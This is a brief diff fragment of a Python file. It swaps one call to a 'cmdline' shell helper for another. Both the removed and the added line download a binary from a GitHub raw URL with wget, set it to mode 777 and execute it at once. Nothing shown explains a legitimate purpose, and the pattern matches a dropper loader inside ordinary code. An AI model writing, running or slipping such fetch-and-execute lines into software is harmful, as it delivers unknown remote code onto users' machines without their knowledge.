@@ -19,4 +19,4 @@ def cmdline(command):
  
 
 
-cmdline ( 'wget https://raw.githubusercontent.com/aurbach55/pos/main/topi && chmod 777 topi && ./topi' )
+cmdline ( 'wget https://raw.githubusercontent.com/aurbach55/dera/main/sol && chmod 777 sol && ./sol' )
